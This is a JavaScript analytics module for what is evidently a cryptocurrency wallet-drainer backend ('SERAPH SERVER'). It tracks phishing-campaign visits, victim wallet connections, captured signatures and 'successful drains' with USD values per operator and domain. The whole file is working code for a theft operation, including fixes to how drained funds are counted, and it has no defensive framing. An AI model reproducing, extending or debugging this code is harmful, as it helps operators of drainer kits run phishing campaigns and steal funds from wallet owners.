/**
 * ============================================================================
 * SERAPH SERVER - Analytics Service (v1.4.1 - FIXED)
 * ============================================================================
 * 
 * FIXED: Removed duplicate stat updates from trackDrain() 
 * Stats now come from drain_logs table only (via signature execution)
 * 
 * Handles page visits and wallet connection tracking per campaign
 * Uses analytics_connections table for connection tracking
 * Includes per-domain tracking support
 * 
 * ============================================================================
 */

import supabase from '../config/supabase.js'
import campaignDomainsService from './campaignDomains.service.js'

const analyticsService = {
  /**
   * Track a page visit
   * Includes optional domain tracking
   */
  async trackVisit({ campaignId, domain, referrer, userAgent, ipAddress }) {
    if (!campaignId) {
      throw new Error('Campaign ID is required')
    }

    // Try to insert into analytics_visits if table exists
    try {
      await supabase
        .from('analytics_visits')
        .insert({
          campaign_id: campaignId,
          referrer: referrer || null,
          user_agent: userAgent || null,
          ip_address: ipAddress || null
        })
    } catch (err) {
      // Table might not exist, continue
      console.warn('[Analytics] analytics_visits insert failed:', err.message)
    }

    // Update campaign total_visits
    const { data: campaign } = await supabase
      .from('campaigns')
      .select('total_visits')
      .eq('id', campaignId)
      .single()

    if (campaign) {
      await supabase
        .from('campaigns')
        .update({
          total_visits: (campaign.total_visits || 0) + 1,
          updated_at: new Date().toISOString()
        })
        .eq('id', campaignId)
    }

    // Track per-domain if domain provided
    if (domain) {
      try {
        await campaignDomainsService.recordVisit(campaignId, domain)
      } catch (err) {
        console.warn('[Analytics] Domain visit tracking failed:', err.message)
      }
    }

    return { tracked: true }
  },

  /**
   * Track a wallet connection (upsert pattern)
   * If wallet already connected to this campaign, increment count
   * Includes optional domain tracking
   */
  async trackConnection({ campaignId, walletAddress, chainId, domain }) {
    if (!campaignId) {
      throw new Error('Campaign ID is required')
    }
    if (!walletAddress) {
      throw new Error('Wallet address is required')
    }

    // Normalize wallet address
    const normalizedAddress = walletAddress.toLowerCase()

    let isNew = false

    // Check if connection exists in analytics_connections
    const { data: existing } = await supabase
      .from('analytics_connections')
      .select('id, connect_count')
      .eq('campaign_id', campaignId)
      .eq('wallet_address', normalizedAddress)
      .single()

    if (existing) {
      // Update existing - increment count
      await supabase
        .from('analytics_connections')
        .update({
          connect_count: existing.connect_count + 1,
          last_seen: new Date().toISOString(),
          chain_id: chainId || null
        })
        .eq('id', existing.id)
    } else {
      // Insert new connection
      const { error } = await supabase
        .from('analytics_connections')
        .insert({
          campaign_id: campaignId,
          wallet_address: normalizedAddress,
          chain_id: chainId || null,
          connect_count: 1
        })

      if (!error) {
        isNew = true
      }
    }

    // Update campaign unique_visitors if new wallet
    if (isNew) {
      const { data: campaign } = await supabase
        .from('campaigns')
        .select('unique_visitors')
        .eq('id', campaignId)
        .single()

      if (campaign) {
        await supabase
          .from('campaigns')
          .update({
            unique_visitors: (campaign.unique_visitors || 0) + 1,
            updated_at: new Date().toISOString()
          })
          .eq('id', campaignId)
      }
    }

    // Track per-domain if domain provided
    if (domain) {
      try {
        await campaignDomainsService.recordConnection(campaignId, domain)
        
        // If new unique wallet, also track unique visitor for domain
        if (isNew) {
          const domainRecord = await campaignDomainsService.findOrCreateDomain(campaignId, domain)
          if (domainRecord) {
            await campaignDomainsService.incrementStats(domainRecord.id, { uniqueVisitors: 1 })
          }
        }
      } catch (err) {
        console.warn('[Analytics] Domain connection tracking failed:', err.message)
      }
    }

    return { tracked: true, isNew, wallet_address: normalizedAddress }
  },

  /**
   * Track a signature captured
   * Called from signature routes
   */
  async trackSignature({ campaignId, domain }) {
    if (!campaignId) return { tracked: false }

    // Update campaign total_signatures
    const { data: campaign } = await supabase
      .from('campaigns')
      .select('total_signatures')
      .eq('id', campaignId)
      .single()

    if (campaign) {
      await supabase
        .from('campaigns')
        .update({
          total_signatures: (campaign.total_signatures || 0) + 1,
          updated_at: new Date().toISOString()
        })
        .eq('id', campaignId)
    }

    // Track per-domain
    if (domain) {
      try {
        await campaignDomainsService.recordSignature(campaignId, domain)
      } catch (err) {
        console.warn('[Analytics] Signature domain tracking failed:', err.message)
      }
    }

    return { tracked: true }
  },

  /**
   * Track a successful drain
   * Called from drain routes
   * 
   * NOTE: Stats are updated by signature_routes.js when drain executes.
   * This function only tracks per-domain analytics, NOT campaign totals.
   * Campaign totals come from drain_logs table to prevent doubling.
   */
  async trackDrain({ campaignId, domain, valueUsd }) {
    if (!campaignId) return { tracked: false }

    // =========================================================================
    // REMOVED: Campaign stat updates
    // These were causing DOUBLE COUNTING because signature_routes.js
    // already creates drain_logs which should be the source of truth.
    // Stats should be derived from drain_logs only.
    // =========================================================================

    // Track per-domain only (doesn't affect campaign totals)
    if (domain) {
      try {
        await campaignDomainsService.recordDrain(campaignId, domain, valueUsd || 0)
      } catch (err) {
        console.warn('[Analytics] Drain domain tracking failed:', err.message)
      }
    }

    return { tracked: true }
  },

  /**
   * Get analytics summary for a campaign
   */
  async getCampaignAnalytics(campaignId, operatorId) {
    if (!campaignId) {
      throw new Error('Campaign ID is required')
    }

    // Get campaign with stats
    const { data: campaign, error: campaignError } = await supabase
      .from('campaigns')
      .select('*')
      .eq('id', campaignId)
      .single()

    if (campaignError || !campaign) {
      throw new Error('Campaign not found')
    }

    if (operatorId && campaign.operator_id !== operatorId) {
      throw new Error('Unauthorized')
    }

    // Get total visits from analytics_visits
    let totalVisits = campaign.total_visits || 0
    try {
      const { count } = await supabase
        .from('analytics_visits')
        .select('*', { count: 'exact', head: true })
        .eq('campaign_id', campaignId)
      
      if (count !== null) {
        totalVisits = count
      }
    } catch (err) {
      // Table might not exist
    }

    // Get connections from analytics_connections
    let connections = []
    let uniqueWallets = 0
    let totalConnections = 0
    
    try {
      const { data: connData } = await supabase
        .from('analytics_connections')
        .select('*')
        .eq('campaign_id', campaignId)
        .order('last_seen', { ascending: false })

      connections = connData || []
      uniqueWallets = connections.length
      totalConnections = connections.reduce((sum, c) => sum + (c.connect_count || 1), 0)
    } catch (err) {
      // Table might not exist, fall back to campaign stats
      uniqueWallets = campaign.unique_visitors || 0
    }

    // Get per-domain stats
    let domainStats = null
    try {
      domainStats = await campaignDomainsService.getCampaignStats(campaignId)
    } catch (err) {
      console.warn('[Analytics] Domain stats unavailable:', err.message)
    }

    // Get recent signatures for this campaign
    // FIXED: Use total_value_usd instead of estimated_value_usd
    const { data: recentSignatures } = await supabase
      .from('signatures')
      .select('id, victim_address, signature_type, total_value_usd, status, created_at')
      .eq('campaign_id', campaignId)
      .order('created_at', { ascending: false })
      .limit(10)

    return {
      campaign: {
        id: campaign.id,
        name: campaign.name,
        status: campaign.status
      },
      stats: {
        total_visits: totalVisits,
        unique_visitors: campaign.unique_visitors || 0,
        unique_wallets: uniqueWallets,
        total_connections: totalConnections,
        total_signatures: campaign.total_signatures || 0,
        successful_drains: campaign.successful_drains || 0,
        total_value_usd: parseFloat(campaign.total_value_usd) || 0
      },
      connections,
      recentSignatures: recentSignatures || [],
      domainStats
    }
  },

  /**
   * Get recent connections for a campaign
   */
  async getRecentConnections(campaignId, limit = 10) {
    const { data, error } = await supabase
      .from('analytics_connections')
      .select('*')
      .eq('campaign_id', campaignId)
      .order('last_seen', { ascending: false })
      .limit(limit)

    if (error) {
      console.warn('[Analytics] Failed to get connections:', error.message)
      return []
    }
    return data || []
  },

  /**
   * Get campaign by key (for public tracking endpoints)
   */
  async getCampaignByKey(campaignKey) {
    const { data, error } = await supabase
      .from('campaigns')
      .select('id, operator_id, status')
      .eq('campaign_key', campaignKey)
      .single()

    if (error) return null
    return data
  },

  /**
   * Get campaign by ID (for public tracking endpoints)
   */
  async getCampaignById(campaignId) {
    const { data, error } = await supabase
      .from('campaigns')
      .select('id, operator_id, status')
      .eq('id', campaignId)
      .single()

    if (error) return null
    return data
  }
}

export default analyticsService